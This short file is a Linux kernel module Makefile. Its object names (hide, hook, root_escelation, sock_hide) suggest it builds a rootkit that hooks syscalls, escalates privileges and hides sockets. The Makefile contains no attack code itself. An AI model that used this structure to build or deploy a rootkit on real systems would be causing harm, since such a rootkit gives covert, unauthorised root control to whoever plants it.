
KDIR ?= /lib/modules/$(shell uname -r)/build

ccflags-y+= -std=gnu99 -g3 -DZL_DEBUG

obj-m += zl.o 
zl-objs := kmodule.o hide.o hook.o root_escelation_inline.o root_escelation_syscall.o sock_hide.o
all: modules

modules modules_install clean help:
	$(MAKE) -C $(KDIR) M=$(PWD) $@
